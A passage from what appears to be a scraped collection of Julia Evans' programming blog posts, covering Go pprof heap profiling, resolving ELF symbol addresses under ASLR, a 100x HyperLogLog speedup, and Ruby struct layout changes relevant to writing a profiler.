package  but I haven’t done that. \n\n Useful pprof reading \n\n Here is every useful link I’ve found so far about pprof on the internet. Basically the material on\nthe internet about pprof seems to be the official documentation + rakyll’s amazing blog. \n\n \n Setting up a pprof webserver:  https://golang.org/pkg/net/http/pprof/ \n Generating pprof profiles in code:  https://golang.org/pkg/runtime/pprof/ \n https://github.com/google/pprof  (from which I found out that  pprof  can read perf files!!) \n The developer docs:  https://github.com/google/pprof/blob/master/doc/pprof.md \n The output of  go tool pprof --help  (I pasted the output on my system  here ) \n @rakyll ’s blog, which has a huge number of great posts about pprof:  https://rakyll.org/archive/ . In particular  this post on custom pprof profile types  and  this on the newish profile type for seeing contended mutexes  are great. \n \n\n (there are probably also talks about pprof but I am too impatient to watch talks, that’s part of why\nI write lots of blog posts and give few talks) \n\n What’s a profile? What kinds of profiles can I get? \n\n When understanding how things work I like to start at the beginning. What is a “profile” exactly? \n\n Well, let’s read the documentation! The 7th time I looked at  the runtime/pprof docs , I read this very useful sentence: \n\n \n A Profile is a collection of stack traces showing the call sequences that led to instances of a\nparticular event, such as allocation. Packages can create and maintain their own profiles; the most\ncommon use is for tracking resources that must be explicitly closed, such as files or network\nconnections. \n\n Each Profile has a unique name. A few profiles are predefined: \n \n\n goroutine    - stack traces of all current goroutines\nheap         - a sampling of all heap allocations\nthreadcreate - stack traces that led to the creation of new OS threads\nblock        - stack traces that led to blocking on synchronization primitives\nmutex        - stack traces of holders of contended mutexes\n \n\n There are 7 places you can get profiles in the default webserver: the ones mentioned above \n\n \n http://localhost:6060/debug/pprof/goroutine \n http://localhost:6060/debug/pprof/heap \n http://localhost:6060/debug/pprof/threadcreate \n http://localhost:6060/debug/pprof/block \n http://localhost:6060/debug/pprof/mutex \n \n\n and also 2 more: the CPU profile and the CPU trace. \n\n \n http://localhost:6060/debug/pprof/profile \n http://localhost:6060/debug/pprof/trace?seconds=5 \n \n\n To analyze these profiles (lists of stack traces), the tool to use is  go tool pprof , which is a bunch of\ntools for visualizing stack traces. \n\n super confusing note : the trace endpoint ( /debug/pprof/trace?seconds=5 ), unlike all the rest, outputs a file that is  not  a\npprof profile. Instead it’s a  trace  and you can view it using  go tool trace  (not  go tool pprof ). \n\n You can see the available profiles with  http://localhost:6060/debug/pprof/  in your browser. Except\nit doesn’t tell you about   /debug/pprof/profile  or  /debug/pprof/trace  for some reason. \n\n All of these kinds of profiles (goroutine, heap allocations, etc) are just collections of\nstacktraces, maybe with some metadata attached. If we look at the  pprof protobuf definition , you see that a profile is mostly a bunch of  Sample s. \n\n A sample is basically a stack trace. That stack trace might have some extra information attached to\nit! For example in a heap profile, the stack trace has a number of bytes of memory attached to it. I\nthink the Samples are the most important part of the profile. \n\n We’re going to deconstruct what  exactly  is inside a pprof file later, but for now let’s start by\ndoing a quick example of what analyzing a heap profile looks like! \n\n Getting a heap profile with pprof \n\n I’m mostly interested in debugging memory problems right now. So I decided to write a program that\nallocates a bunch of memory to profile with pprof. \n\n func main() {\n    // we need a webserver to get the pprof webserver\n    go func() {\n        log.Println(http.ListenAndServe(\"localhost:6060\", nil))\n    }()\n    fmt.Println(\"hello world\")\n    var wg sync.WaitGroup\n    wg.Add(1)\n    go leakyFunction(wg)\n    wg.Wait()\n}\n\nfunc leakyFunction(wg sync.WaitGroup) {\n    defer wg.Done()\n    s := make([]string, 3)\n    for i:= 0; i < 10000000; i++{\n        s = append(s, \"magical pandas\")\n        if (i % 100000) == 0 {\n            time.Sleep(500 * time.Millisecond)\n        }\n    }\n}\n \n\n Basically this just starts a goroutine  leakyFunction  that allocates a bunch of memory and then\nexits eventually. \n\n Getting a heap profile of this program is really easy – we just need to run  go tool pprof\nhttp://localhost:6060/debug/pprof/heap . This puts us into an interactive mode where we run  top \n\n $ go tool pprof  http://localhost:6060/debug/pprof/heap\n    Fetching profile from http://localhost:6060/debug/pprof/heap\n    Saved profile in /home/bork/pprof/pprof.localhost:6060.inuse_objects.inuse_space.004.pb.gz\n    Entering interactive mode (type \"help\" for commands)\n(pprof) top\n    34416.04kB of 34416.04kB total (  100%)\n    Showing top 10 nodes out of 16 (cum >= 512.04kB)\n          flat  flat%   sum%        cum   cum%\n       33904kB 98.51% 98.51%    33904kB 98.51%  main.leakyFunction\n \n\n I can also do the same thing outside interactive mode with  go tool pprof -top  http://localhost:6060/debug/pprof/heap . \n\n This basically tells us that  main.leakyFunction  is using 33.9MB of memory. Neat! \n\n We can also generate a PNG profile like this:  go tool pprof -png  http://localhost:6060/debug/pprof/heap > out.png . \n\n Here’s what that looks like (I ran it at a different time so it’s only using 100MBish of memory). \n\n \n \n \n\n what do the stack traces in a heap profile mean? \n\n This is not complicated but also was not 100% obvious to me. The stack traces in the heap profile\nare the stack trace at time of allocation. \n\n So the stack traces in the heap profile might be for code that is not running anymore – like maybe\na function allocated a bunch of memory, returned, and a different function that should be freeing\nthat memory is misbehaving. So the function to blame for the memory leak might be totally different\nthan the function listed in the heap profile. \n\n alloc_space vs inuse_space \n\n go tool pprof has the option to show you either  allocation counts  or  in use memory . If\nyou’re concerned with the amount of memory being  used , you probably want the inuse metrics, but\nif you’re worried about time spent in garbage collection, look at allocations! \n\n   -inuse_space      Display in-use memory size\n  -inuse_objects    Display in-use object counts\n  -alloc_space      Display allocated memory size\n  -alloc_objects    Display allocated object counts\n \n\n I was originally confused about this works – the profiles have already be collected! How can I make\nthis choice after the fact? I think how the heap profiles work is – allocations are recorded at\nsome sample rate. Then every time one of those allocation is  freed , that’s also recorded. So you\nget a history of both allocations and frees for some sample of memory activity. Then when it comes\ntime to analyze your memory usage, you can decide where you want inuse memory or total allocation counts! \n\n You can read the source for the memory profiler here:  https://golang.org/src/runtime/mprof.go . It\nhas a lot of useful comments! For example here are the comments about setting the sample rate: \n\n // MemProfileRate controls the fraction of memory allocations\n// that are recorded and reported in the memory profile.\n// The profiler aims to sample an average of\n// one allocation per MemProfileRate bytes allocated.\n\n// To include every allocated block in the profile, set MemProfileRate to 1.\n// To turn off profiling entirely, set MemProfileRate to 0.\n\n// The tools that process the memory profiles assume that the\n// profile rate is constant across the lifetime of the program\n// and equal to the current value. Programs that change the\n// memory profiling rate should do so just once, as early as\n// possible in the execution of the program (for example,\n// at the beginning of main).\n \n\n pprof fundamentals: deconstructing a pprof file \n\n When I started working with pprof I was confused about what was actually happening. It was\ngenerating these heap profiles named like  pprof.localhost:6060.inuse_objects.inuse_space.004.pb.gz \n– what is that? How can I see the contents? \n\n Well, let’s take a look!! I wrote an even simpler Go program to get the simplest possible heap\nprofile. \n\n package main\n\nimport \"runtime\"\nimport \"runtime/pprof\"\nimport \"os\"\nimport \"time\"\n\nfunc main() {\n    go leakyFunction()\n    time.Sleep(500 * time.Millisecond)\n    f, _ := os.Create(\"/tmp/profile.pb.gz\")\n    defer f.Close()\n    runtime.GC()\n    pprof.WriteHeapProfile(f);\n}\n\nfunc leakyFunction() {\n    s := make([]string, 3)\n    for i:= 0; i < 10000000; i++{\n        s = append(s, \"magical pprof time\")\n    }\n}\n \n\n This program just allocates some memory, writes a heap profile, and exits. Pretty simple. Let’s look\nat this file  /tmp/profile.pb.gz ! You can download a gunzipped version  profile.pb \n here: profile.pb . I installed protoc using  these directions . \n\n profile.pb  is a protobuf file, and it turns out you can view protobuf files with  protoc , the\nprotobuf compiler. \n\n go get github.com/google/pprof/proto\nprotoc --decode=perftools.profiles.Profile  $GOPATH/src/github.com/google/pprof/proto/profile.proto --proto_path $GOPATH/src/github.com/google/pprof/proto/\n \n\n The output of this is a bit long, you can view it all here:  output . \n\n Here’s a summary though of what’s in this heap profile file! This contains 1 sample. A sample is a\nstack trace, and this stack trace has 2 locations: 1 and 2. What are locations 1 and 2? Well they\ncorrespond to mappings 1 and 2, which in turn correspond to filenames 7 and 8. \n\n If we look at the string table, we see that filenames 7 and 8 are these two: \n\n string_table: \"/home/bork/work/experiments/golang-pprof/leak_simplest\"\nstring_table: \"[vdso]\"\n \n\n sample {\n  location_id: 1\n  location_id: 2\n  value: 1\n  value: 34717696\n  value: 1\n  value: 34717696\n}\nmapping {\n  id: 1\n  memory_start: 4194304\n  memory_limit: 5066752\n  filename: 7\n}\nmapping {\n  id: 2\n  memory_start: 140720922800128\n  memory_limit: 140720922808320\n  filename: 8\n}\nlocation {\n  id: 1\n  mapping_id: 1\n  address: 5065747\n}\nlocation {\n  id: 2\n  mapping_id: 1\n  address: 4519969\n}\nstring_table: \"\"\nstring_table: \"alloc_objects\"\nstring_table: \"count\"\nstring_table: \"alloc_space\"\nstring_table: \"bytes\"\nstring_table: \"inuse_objects\"\nstring_table: \"inuse_space\"\nstring_table: \"/home/bork/work/experiments/golang-pprof/leak_simplest\"\nstring_table: \"[vdso]\"\nstring_table: \"[vsyscall]\"\nstring_table: \"space\"\ntime_nanos: 1506268926947477256\nperiod_type {\n  type: 10\n  unit: 4\n}\nperiod: 524288\n \n\n pprof files don’t always contain function names \n\n One interesting thing about this pprof file  profile.pb  is that it doesn’t contain the names of the\nfunctions we’re running! But If I run  go tool pprof  on it, it prints out the name of the leaky\nfunction. How did you do that,  go tool pprof ?! \n\n go tool pprof -top  profile.pb \n59.59MB of 59.59MB total (  100%)\n      flat  flat%   sum%        cum   cum%\n   59.59MB   100%   100%    59.59MB   100%  main.leakyFunction\n         0     0%   100%    59.59MB   100%  runtime.goexit\n \n\n I answered this with strace, obviously – I straced  go tool pprof  and this is what I saw: \n\n 5015  openat(AT_FDCWD, \"/home/bork/pprof/binaries/leak_simplest\", O_RDONLY|O_CLOEXEC <unfinished ...>\n5015  openat(AT_FDCWD, \"/home/bork/work/experiments/golang-pprof/leak_simplest\", O_RDONLY|O_CLOEXEC) = 3\n \n\n So it seems that  go tool pprof  noticed that the filename in  profile.pb  was /home/bork/work/experiments/golang-pprof/leak_simplest, and then it just opened up that file on my computer and used that to get the function names. Neat! \n\n You can also pass the binary to  go tool pprof  like  go tool pprof -out $BINARY_FILE myprofile.pb.gz . Sometimes pprof files contain function names and\nsometimes they don’t, I haven’t figured out what determines that yet. \n\n pprof keeps improving! \n\n also I found out that thanks to the great work of people like rakyll, pprof keeps getting better!! For example There’s\nthis pull request  https://github.com/google/pprof/pull/188  which is being worked on RIGHT NOW which\nadds flamegraph support to the pprof web interface. Flamegraphs are the best thing in the universe\nso I’m very excited for that to be available. \n\n If I got something wrong (I probably did) let me know!! \n\n"},
{"url": "https://jvns.ca/blog/2018/01/09/resolving-symbol-addresses/", "title": "Profiler adventures: resolving symbol addresses is hard!", "content": "\n     \n\n The other day I posted  How does gdb call functions? .\nIn that post I said: \n\n \n Using the symbol table to figure out the address of the function you want to call is pretty\nstraightforward \n \n\n Unsurprisingly, it turns out that figuring out the address in memory corresponding to a given\nsymbol is actually not really that straightforward. This is actually something I’ve been doing in my\nprofiler, and I think it’s interesting, so I thought I’d write about it! \n\n Basically the problem I’ve been trying to solve is – I have a symbol (like  ruby_api_version ), and\nI want to figure out which address that symbol is mapped to in my target process’s memory (so that I\ncan get the data in it, like the Ruby process’s Ruby version). So far I’ve run into (and fixed!) 3 issues\nwhen trying to do this: \n\n \n When binaries are loaded into memory, they’re loaded at a random address (so I can’t just read\nthe symbol table) \n The symbol I want isn’t necessary in the “main” binary ( /proc/PID/exe , sometimes it’s in some\nother dynamically linked library) \n I need to look at the ELF program header to adjust which address I look at for the symbol \n \n\n I’ll start with some background, and then explain these 3 things! (I actually don’t know what gdb\ndoes) \n\n what’s a symbol? \n\n Most binaries have functions and variables in them. For instance, Perl has a global variable called\n PL_bincompat_options  and a function called  Perl_sv_catpv_mg . \n\n Sometimes binaries need to look up functions from another binary (for example, if the binary is a\ndynamically linked library, you need to look up its functions by name). Also sometimes you’re\ndebugging your code and you want to know what function an address corresponds to. \n\n Symbols are how you look up functions / variables in a binary. They’re in a section called the\n“symbol table”. The symbol table is basically an index for your binary! Sometimes they’re missing\n(“stripped”). There are a lot of binary formats, but this post is just about the usual binary format\non Linux: ELF. \n\n how do you get the symbol table of a binary? \n\n A thing that I learned today (or at least learned and then forgot) is that there are 2 possible\nsections symbols can live in:  .symtab  and  .dynsym .  .dynsym  is the “dynamic symbol table”.\nAccording to  this page , the dynsym is a smaller version of the symtab that only contains global symbols. \n\n There are at least 3 ways to read the symbol table of a binary on Linux: you can use nm, objdump, or\nreadelf. \n\n \n read the .symtab :  nm $FILE ,  objdump --syms $FILE ,  readelf -a $FILE \n read the .dynsym :  nm -D $FILE ,  objdump --dynamic-syms $FILE ,  readelf -a $FILE \n \n\n readelf -a  is the same in both cases because  readelf -a  just shows you everything in an ELF\nfile. It’s my favorite because I don’t need to guess where the information I want is, I can just\nprint out everything and then use grep. \n\n Here’s an example of some of the symbols in  /usr/bin/perl . You can see that each symbol has a\n name , a  value , and a  type . The value is basically the offset of the code/data\ncorresponding to that symbol in the binary. (except some symbols have value 0. I think that has\nsomething to do with dynamic linking but I don’t understand it so we’re not going to get into it) \n\n $ readelf -a /usr/bin/perl\n...\n   Num:    Value          Size Type   Ndx Name\n   523: 00000000004d6590    49 FUNC    14 Perl_sv_catpv_mg\n   524: 0000000000543410     7 FUNC    14 Perl_sv_copypv\n   525: 00000000005a43e0   202 OBJECT  16 PL_bincompat_options\n   526: 00000000004e6d20  2427 FUNC    14 Perl_pp_ucfirst\n   527: 000000000044a8c0  1561 FUNC    14 Perl_Gv_AMupdate\n...\n \n\n the question we want to answer: what address is a symbol mapped to? \n\n That’s enough background! \n\n Now – suppose I’m a debugger, and I want to know what address the  ruby_api_version  symbol is\nmapped to. Let’s use readelf to look at the relevant Ruby binary! \n\n readelf -a  ~/.rbenv/versions/2.1.6/bin/ruby | grep ruby_api_version\n   365: 00000000001f9180    12 OBJECT  GLOBAL DEFAULT   15 ruby_api_version\n \n\n Neat! The offset of  ruby_api_version  is  0x1f9180 . We’re done, right? Of course not! :) \n\n Problem 1: ASLR (Address space layout randomization) \n\n Here’s the first issue: when Linux loads a binary into memory (like\n ~/.rbenv/versions/2.1.6/bin/ruby ), it doesn’t just load it at the  0  address. Instead, it usually\nadds a random offset. Wikipedia’s article on ASLR explains why: \n\n \n Address space layout randomization (ASLR) is a memory-protection process for operating systems\n(OSes) that guards against buffer-overflow attacks by randomizing the location where system\nexecutables are loaded into memory. \n \n\n We can see this happening in practice: I started  /home/bork/.rbenv/versions/2.1.6/bin/ruby  3 times\nand every time the process gets mapped to a different place in memory. ( 0x56121c86f000 ,  0x55f440b43000 ,  0x56163334a000 ) \n\n Here we’re meeting our good friend  /proc/$PID/maps  – this file contains a list of memory maps for\na process. The memory maps tell us every address range in the process’s virtual memory (it turns out\nvirtual memory isn’t contiguous! Instead process get a bunch of possibly-disjoint memory maps!).\nThis file is so useful! You can find the address of the stack, the heap, every dynamically loaded\nlibrary, anonymous memory maps, and probably more. \n\n $ cat /proc/(pgrep -f 2.1.6)/maps | grep 'bin/ruby'\n56121c86f000-56121caf0000 r-xp 00000000 00:32 323508                     /home/bork/.rbenv/versions/2.1.6/bin/ruby\n56121ccf0000-56121ccf5000 r--p 00281000 00:32 323508                     /home/bork/.rbenv/versions/2.1.6/bin/ruby\n56121ccf5000-56121ccf7000 rw-p 00286000 00:32 323508                     /home/bork/.rbenv/versions/2.1.6/bin/ruby\n$ cat /proc/(pgrep -f 2.1.6)/maps | grep 'bin/ruby'\n55f440b43000-55f440dc4000 r-xp 00000000 00:32 323508                     /home/bork/.rbenv/versions/2.1.6/bin/ruby\n55f440fc4000-55f440fc9000 r--p 00281000 00:32 323508                     /home/bork/.rbenv/versions/2.1.6/bin/ruby\n55f440fc9000-55f440fcb000 rw-p 00286000 00:32 323508                     /home/bork/.rbenv/versions/2.1.6/bin/ruby\n$ cat /proc/(pgrep -f 2.1.6)/maps | grep 'bin/ruby'\n56163334a000-5616335cb000 r-xp 00000000 00:32 323508                     /home/bork/.rbenv/versions/2.1.6/bin/ruby\n5616337cb000-5616337d0000 r--p 00281000 00:32 323508                     /home/bork/.rbenv/versions/2.1.6/bin/ruby\n5616337d0000-5616337d2000 rw-p 00286000 00:32 323508                     /home/bork/.rbenv/versions/2.1.6/bin/ruby\n \n\n Okay, so in the last example we see that our binary is mapped at  0x56163334a000 .  If we combine\nthis with the knowledge that  ruby_api_version  is at  0x1f9180 , then that means that we just need\nto look that the address  0x1f9180 + 0x56163334a000  to find our variable, right? \n\n Yes! In this case, that works. But in other cases it won’t! So that brings us to problem 2. \n\n Problem 2: dynamically loaded libraries \n\n Next up, I tried running system Ruby:  /usr/bin/ruby . This binary has basically no symbols at all!\nDisaster! In particular it does not have a  ruby_api_version  symbol. \n\n But when I tried to print the  ruby_api_version  variable with gdb, it worked!!! Where was gdb\nfinding my symbol? I found the answer with the help of our good friend:  /proc/PID/maps \n\n It turns out that  /usr/bin/ruby  dynamically loads a library called  libruby-2.3 . You can see it\nin the memory maps here: \n\n $ cat /proc/(pgrep -f /usr/bin/ruby)/maps | grep libruby\n7f2c5d789000-7f2c5d9f1000 r-xp 00000000 00:14 /usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3.0\n7f2c5d9f1000-7f2c5dbf0000 ---p 00268000 00:14 /usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3.0\n7f2c5dbf0000-7f2c5dbf6000 r--p 00267000 00:14 /usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3.0\n7f2c5dbf6000-7f2c5dbf7000 rw-p 0026d000 00:14 /usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3.0\n \n\n And if we read it with  readelf , we find the address of that symbol! \n\n readelf -a /usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3.0 | grep ruby_api_version\n   374: 00000000001c72f0    12 OBJECT  GLOBAL DEFAULT   13 ruby_api_version\n \n\n So in this case the address of the symbol we want is  0x7f2c5d789000  (the start of the libruby-2.3\nmemory map) plus  0x1c72f0 . Nice! But we’re still not done. There is (at least) one more mystery! \n\n Problem 3: the  vaddr  offset in the ELF program header \n\n This one I just figured out today so it’s the one I have the shakiest understanding of. Here’s what\nhappened. \n\n I was running system ruby on Ubuntu 14.04: Ruby 1.9.3. And my usual code (find the libruby map,\nget its address, get the symbol offset, add them up) wasn’t working!!! I was confused. \n\n But I’d asked Julian if he knew of any weird stuff I need to worry about a while back and he said “well,\nyou should read the code for  dlsym , you’re trying to do basically the same thing”. So I decided\nto, instead of randomly guessing, go read the code for  dlsym . \n\n The man page for  dlsym  says “dlsym, dlvsym - obtain address of a symbol in a shared object or\nexecutable”. Perfect!! \n\n Here’s the dlsym code from musl I read . (musl is like glibc, but, different. Maybe easier to read? I don’t understand it that well.) \n\n The dlsym code says (on line 1468)  return def.dso->base + def.sym->st_value;  That sounds like what\nI’m doing!! But what’s  dso->base ? It looks like  base = map - addr_min; , and  addr_min = ph->p_vaddr; . (there’s also some stuff that makes sure  addr_min  is aligned with the page size which I should maybe pay attention to.) \n\n So the code I want is something like  map_base - ph->p_vaddr + sym->st_value . \n\n I looked up this  vaddr  thing in the ELF program header, subtracted it from my calculation, and\nvoilà! It worked!!! \n\n there are probably more problems! \n\n I imagine I will discover even more ways that I am calculating the symbol address wrong. It’s\ninteresting that such a seemingly simple thing (“what’s the address of this symbol?”) is so\ncomplicated! \n\n It would be nice to be able to just call  dlsym  and have it do all the right calculations for me,\nbut I think I can’t because the symbol is in a different process. Maybe I’m wrong about that though!\nI would like to be wrong about that. If you know an easier way to do all this I would very much like\nto know! Someone on Reddit linked to  this interesting gist they wrote   which seems to also reimplement dlsym. \n\n"},
{"url": "https://jvns.ca/blog/2015/09/10/a-millisecond-isnt-fast-and-how-we-fixed-it/", "title": "A millisecond isn't fast (and how we made it 100x faster)", "content": "\n      Hi friends! For the first time today I’m going to tell you about my DAY\nAT WORK (machine learning at Stripe) yesterday. =D. This is a\ncollaboration with  Kamal Marhubi  who did this\nprofiling with me after work because I was so mad about the performance. \n\n I used to think a millisecond was fast. At work, I have code that runs\nsome VERY_LARGE_NUMBER of times. It’s distributed and split up into\ntasks, and an individual task runs the code more than 6 million times. \n\n I wrote a benchmark for the Slow Code and found it could process\n~1000 records/s. This meant that processing 6 million things would take\n1.5 hours, which is Slow. The code is kind of complicated, so originally\nwe all thought this was a reasonable amount of time. But my heart was\nsad. \n\n Yesterday  Avi  (who is the best) and I\nlooked at why it was so damn slow (~1 millisecond/record) in some more\ndepth. This code is open source so I can show it to you! We profiled using\nVisualVM and, after doing some optimizations, found out that it was\nspending all its time in  DenseHLL$x$6 . This is mystery Scala speak for\nthis code block from Twitter’s Algebird library that estimates the size of a HyperLogLog: \n\n   lazy val (zeroCnt, z) = {\n    var count: Int = 0\n    var res: Double = 0\n\n    // goto while loop to avoid closure\n    val arr: Array[Byte] = v.array\n    val arrSize: Int = arr.size\n    var idx: Int = 0\n    while (idx < arrSize) {\n      val mj = arr(idx)\n      if (mj == 0) {\n        count += 1\n        res += 1.0\n      } else {\n        res += java.lang.Math.pow(2.0, -mj)\n      }\n      idx += 1\n    }\n    (count, 1.0 / res)\n  }\n \n\n from\n HyperLogLog.scala \n\n This is a little inscrutable and I’m not going to explain what this code\ndoes, but  arrSize  in my case is 4096. So basically, we have\nsomething like 10,000 floating point operations, and it takes about 1ms\nto do. I am still new to performance optimizations, but I discussed it\nwith Kamal and we decided it was outrageous. Since this loop is  hardly\ndoing anything omg , the obvious target is  java.lang.Math.pow(2.0,\n-mj) , because that looks like the hardest thing. (note: Java is pretty fast. if you are doing normal operations like adding and multiplying numbers it should go REALLY FAST. because  computers are fast ) \n\n (note:  Latency Numbers Every Programmer Should Know  is great and useful in\ncases like this! Many CPU instructions take a nanosecond\nor something. so 10K of them should be on the order of 10 microseconds\nor so. Definitely not a millisecond.) \n\n Kamal and I tried two things: replacing  Math.pow(2, -mj)  with  1.0 / (1 << mj) , and writing a lookup table (since  mj  is a byte and has\n256 possible values, we can just calculate 2^(-mj) for every possible\nvalue up front). \n\n The final performance numbers on the benchmark we picked were: \n\n math.pow:         0.8ms\n1.0 / (1 << mj):  0.017ms (!)\nthe lookup table: 0.008ms (!!!)\n \n\n So we can literally make this code  100 times faster  by just changing\none line. Avi simultaneously came to the same conclusions and\nmade this pull request  Speed up HLL presentation by 100x . Hooray! \n\n I’m learning intuitions for when code is slower than it should be and it\nis THE BEST. Being able to say “this code should not take 10s to process\n10,000 records” is amazing. It is even more amazing when you can\nactually fix it. \n\n \nIf you’re interested in the rest of my day at work for some reason, I\n \n\n \n worked with someone on understanding which of our machine learning models are doing the most work for us \n wrote 2 SQL queries to help someone on the Risk team find accounts with suspicious activity \n wrangled Scala performance (this) so that we can generate training sets for our machine learning models without tearing our hair out \n \n\n"},
{"url": "https://jvns.ca/blog/2017/12/19/how-much-does-the-ruby-abi-change-/", "title": "How often do Ruby's stack struct definitions change?", "content": "\n     \n\n Hello! I am doing some research for my Ruby profiler this week, and so I thought I’d write the\nresearch in a blog post. This is all stuff I’m trying to figure out this morning so it’s all pretty\nearly-stage. \n\n Basically I’m trying to figure out if I can define a finite fixed set of Ruby struct layouts in my\nRuby profiler at compile time (RUBY_2_3_0, RUBY_2_4_0, etc) or if I need to get the struct layouts\nat runtime using DWARF. If you are interested in this and have ideas about this post I’d love to\nhear them on twitter / by email. \n\n Before I dive in the gnarly question of “how often does vm_core.h” change in ways that I care\nabout?“, let’s start with a little background. \n\n how do you get the current Ruby stack out of a Ruby program? \n\n The main question a sampling profiler needs to answer (over and over and over… :)) is “what’s the\nstack right now?“. \n\n If you run gdb on a Ruby 2.1 process with debug symbols installed you can get the \n\n (gdb) p ((struct RString*) ruby_current_thread.cfp.iseq.location.label).as\n$1 = {heap = {len = 7378148951706596193, ptr = 0x0, aux = {capa = 0, shared = 0}}, ary = \"asdfasdf\", '\\000' <repeats 15 times>}\n \n\n In this case you see  ary = \"asdfasdf\"  because the name of the current function is  asdfasdf .\nNeat! That’s pretty simple. \n\n I was pretty specific about saying “on a Ruby 2.1 process” though. What about Ruby 2.2.3? 2.3.0?\n1.9.3? 2.4.0? 2.5.0? Does this  ruby_current_thread.cfp.iseq.location.label  incantation change? Do\nthe internal struct layouts change? The answer is “yes”, and I’m trying to figure out how  often \nit changes \n\n 2 ways of decoding the stack: DWARF and including a header file \n\n Suppose I want to “run”  ruby_current_thread.cfp.iseq.location.label  from a separate process\nfrom my running Ruby program.  To be able to do this, I need to be able to get memory from the\nRuby program (which we’ll consider solved here) and then decode that memory into the right C\nstructs. How do you figure out how the memory maps to the C structs in the Ruby program? 2 possible ways! \n\n \n Hope the Ruby process has DWARF debug symbols installed and use those (this is how gdb works) \n Compile my profiler against the right Ruby header files ahead of time \n \n\n pyflame uses approach #2 (it compiles against Python’s header files) and gdb uses approach #1 (it\nhas a DWARF parser built into it). The  reason  approach #2 works well for pyflame is that there\nare only 3 different possible variations of header files that it needs to be aware of (python 2,\npython 3.4, python 3.6). \n\n Dealing with DWARF is a pain and not every Ruby process has debug symbols, so I’d prefer to be able\nto use approach #2. This post is me trying to figure out what could get in the way of approach #2\nworking! \n\n questions I want to answer in this post \n\n I’m interested in 2 questions: \n\n \n How many changes to the core Ruby structs to I need to know about? Is it just 3 or so (like with\nPython) or are there a lot more? \n are there any  #ifdefs  I need to be worried about messing with my struct layout? \n \n\n What’s this about ifdefs? Well, there are a bunch of places in the Ruby interpreter where it changes\nthe layout of its internal structs based on some compile time values. \n\n typedef struct rb_thread_struct {\n    struct list_node vmlt_node;\n    VALUE self;\n    rb_vm_t *vm;\n\n    rb_execution_context_t *ec;\n\n    VALUE last_status; /* $? */\n\n    /* for cfunc */\n    struct rb_calling_info *calling;\n\n    /* for load(true) */\n    VALUE top_self;\n    VALUE top_wrapper;\n\n    /* thread control */\n    rb_nativethread_id_t thread_id;\n#ifdef NON_SCALAR_THREAD_ID\n    rb_thread_id_string_t thread_id_string;\n#endif\n \n\n Structs I care about \n\n I think the main structs I care about are  rb_thread_struct ,  rb_iseq_struct ,\n rb_iseq_location_struct , and  rb_iseq_constant_body . Here are links to\nthose struct definitions in 5 different Ruby versions. \n\n Ruby 2.1.0 \n\n \n rb_thread_struct \n rb_iseq_struct \n rb_iseq_location_struct \n \n\n Ruby 2.2.0 \n\n \n rb_thread_struct \n rb_iseq_struct \n rb_iseq_location_struct \n \n\n Ruby 2.3.0 \n\n \n rb_thread_struct \n rb_iseq_struct \n rb_iseq_constant_body \n rb_iseq_location_struct \n \n\n Ruby 2.4.0 \n\n \n rb_thread_struct \n rb_iseq_struct \n rb_iseq_constant_body \n rb_iseq_location_struct \n \n\n Ruby 2.5.0rc1 \n\n \n rb_thread_struct \n rb_iseq_struct \n rb_iseq_constant_body \n rb_iseq_location_struct \n \n\n Some changes \n\n \n In Ruby 2.2.0, there’s a new  struct list_node vmlt_node  at the beginning of  rb_thread_struct . This was introduced\nin  f11db2a60 . I think 2.2.0 is the first release\nthat has that commit. Requires a new header file. \n In Ruby 2.2.0, there’s a new  stack_max  field in the  rb_iseq_struct  struct. Requires a new header file. \n In Ruby 2.3.0, most of the contents of the  rb_iseq_struct  struct are moved into the  struct rb_iseq_constant_body *body;  field. (so you need  iseq.body.location  instead of  iseq.location ). Requires a code change. \n In Ruby 2.4.0, the layout of  rb_iseq_constant_body  changes again. Requires a new header file. \n In Ruby 2.5.0, there’s a major refactor where the  ruby_current_thread  global variable is\nreplaced with  ruby_current_execution_context_ptr . The  rb_thread_struct  struct is also\ncompletely different. This change happens in  837fd5e49473 .\nRequires code changes. \n \n\n there are more changes that I haven’t found/cataloged yet, I might update this post later but for\nnow I’m bored. \n\n these are a lot of changes! \n\n It seems like the situation with the Ruby structs defining the Ruby stack is very different from the\nsituation in Python – instead of only having 3 versions to worry about, the struct layouts of the\nstructs I care about change every major Ruby version. (and probably also in the minor versions\nreleases? I haven’t checked yet.). the two options I see right now are \n\n \n Use DWARF (because then I don’t have to worry about the struct layout changes, only the ones that\nrequire code changes) \n Get headers for every minor Ruby version (2.3.1, 2.3.2, 2.3.3, 2.3.4, etc). I made  this quick list  and it seems like there are maybe.. 40 minor ruby versions? That is a lot but not an infinite amount. In Rust I could use bindgen to generate Rust bindings for all those ruby versions and just like.. commit all the versions into my repository. This seems kinda like more work up front but it would be nice to have all the possible weird struct definitions at compile time. And maybe I could get away with less than 40 versions somehow. \n \n\n Quick aside: there’s an  interesting-looking research project by Stephen Kell called liballocs  which makes it easier to work with DWARF. Here’s  an example C file it generates (gzipped)  (from libc). Mostly linking to it so I remember to come back to it later. \n\n That’s all for now! I’ll continue looking at this later. \n\n"},
{"url": "https://jvns.ca/blog/2017/12/17/how-do-ruby---python-profilers-work-/", "title": "How do Ruby & Python profilers work?", "content": "\n     \n\n \ntable {  \n    color: #333;\n    font-family: Helvetica, Arial, sans-serif;\n    border-collapse: \n    collapse; border-spacing: 0; \n}\n\ntd, th {  \n    border: 1px solid #fbf; /* No more visible border */\n    height: 30px; \n    transition: all 0.3s;  /* Simple transition for hover effect */\n    padding: 2px 10px;\n}\n\nth {  \n    background: #ff5e00;  /* Darken header a bit */\n    color: white;\n    font-weight: bold;\n}\n\ntd {  \n    background: #FAFAFA;\n    text-align: center;\n}\n\n/* Cells in even rows (2,4,6...) are one color */        \ntr:nth-child(even) td { background: #fff; }   \n\n/* Cells in odd rows (1,3,5...) are another (excludes header cells)  */        \ntr:nth-child(odd) td { background: #fdb; }  \n\n/* Hover cell effect! */\n \n\n Hello! As a precursor to writing a Ruby profiler I wanted to do a survey of how existing Ruby &\nPython profilers work. This also helps answer a question a lot of folks have been asking me, which\nis “How  do  you write a profiler?” \n\n In this post, we’re just going to focus on CPU profilers (and not, say, memory/heap profilers). I’ll\nexplain some basic general approaches to writing a profiler, give some code examples, and take a\nbunch of examples of popular Ruby & Python profilers and tell you how they work under the hood. \n\n There are probably some mistakes in this post (as research for this post I read parts of the 